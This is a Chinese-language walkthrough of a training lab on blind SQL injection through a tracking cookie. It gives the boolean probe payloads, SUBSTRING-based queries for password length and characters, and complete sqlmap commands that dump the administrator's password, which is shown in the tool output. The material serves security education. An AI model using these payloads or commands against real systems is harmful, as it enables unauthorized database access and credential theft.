# 实验：具有条件响应的盲注 SQL 注入

本实验包含一个盲注 SQL 注入漏洞。应用程序使用跟踪 Cookie 进行分析，并执行包含所提交 Cookie 值的 SQL 查询。

SQL 查询的结果不会返回，也不会显示任何错误消息。但是，如果查询返回任何行，应用程序会在页面中包含一条 `Welcome back`（欢迎回来）消息。

数据库包含一个名为 `users` 的不同表，其中包含名为 `username` 和 `password` 的列。你需要利用盲注 SQL 注入漏洞找出 `administrator` 用户的密码。

为了解决本实验，请以 `administrator` 用户身份登录。

> **提示**
> 你可以假设密码仅包含小写字母和数字字符。

## 步骤

探测
- 访问账户页面
    ```http
    GET /login HTTP/2
    Cookie: TrackingId=YW86pPY08vlp8RX0; session=46PjXLhajDanCuIU3ejdwcTSJ9sFF2BO
    ```
    - 服务器响应
        ```html
        <div>
            Welcome back!
        </div>
        ```

在 cookie 的 TrackingId 字段中探索 SQLi
- `'` 单引号
    - 欢迎元素消失
    - 此时的可能性
        - 单引号仅为字符，导致不匹配
        - 单引号逃逸
- `'--` 单引号与注释
    - 欢迎元素显示
    - 此时推断存在 SQLi

- 不存在的 cookie 与条件语句

    ```sql
    $input = 'x' or 1=1 --
    ```
    - 欢迎元素显示
    - 此时确认存在 SQLi

爆破
- 此处设置推断语句 `x' or [推断语句] --`
    - 若推断为真，则显示欢迎元素

- 确认密码长度，两种语法格式均可
    ```sql
    # 查询时 LENGTH 计算列字符串长度后，由 SELECT 返回作为整数作为查询结果
    $input = 'x' OR (SELECT LENGTH(password) FROM users WHERE username = 'administrator') >= 0 --

    # SELECT 返回查询结果字符串后，由 LENGTH 计算长度
    $input = 'x' OR LENGTH((SELECT password FROM users WHERE username = 'administrator')) >= 0 --
    ```
    - 20 显示，21 消失
        - 长度为 20


字符提取
-  基本字符提取载荷：

    ```sql
    $input = 'x' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a' --
    ```

    - 虽然可使用 burp 的集束炸弹设置到偏移量与当前字符，以爆破出所有密码字符，然而最终仍需手动组合20个字符

    - 使用 python 或 sqlmap


尝试使用 sqlmap
- 将 http 数据保存到文件中 `req.txt`，之后使用参数 `-r` 加载
    - sqlmap 默认使用 http，此处需显式设置 host 的 443 端口，或添加参数 `--force-ssl `
- 命令

    ```sh
    sqlmap -r req.txt \
        --force-ssl \
        --level=5 \
        --risk=3 \
        --threads=10 \
        --force-ssl \
        --technique=B \
        -p "TrackingId" \
        --prefix "'" \
        --suffix "--" \
        --string="Welcome back" 
    ```
    - 成功识别注入点
    - 设置测试等级为最高，确保 Cookie 中的参数被测试
    - 设置目标参数为 `TrackingId`
    - 设置类型为 B 布尔型
    - 设置触点字符串为 `"Welcome back"`

使用 sqlmap 爆破数据
- `--dump` 使用转储数据功能
    - `-D` 数据库
    - `-T` 表
    - `-C` 列
    - `--where` 即 `WHERE`

- 命令

    ```sh
    sqlmap -r req.txt \
        --force-ssl \
        --level=5 \
        --risk=3 \
        --threads=10 \
        --technique=B \
        -p "TrackingId" \
        --prefix "'" \
        --suffix "--" \
        --string="Welcome back" \
        --dump -C "password" -T "users" --where "username = 'administrator'" -D "public"
    ```
    - 若省略数据库指定 `-D "public"`，工具将自动测试当前数据库名

    ```log
    [15:59:04] [INFO] retrieving the length of query output
    [15:59:04] [INFO] retrieved: 20
    [15:59:31] [INFO] retrieved: r5lyr5xhsxqvzklti97u             
    Database: public
    Table: users
    [1 entry]
    +----------------------+
    | password             |
    +----------------------+
    | r5lyr5xhsxqvzklti97u |
    +----------------------+
    ```
    - 成功识别字段长度为 20，并爆破出密码
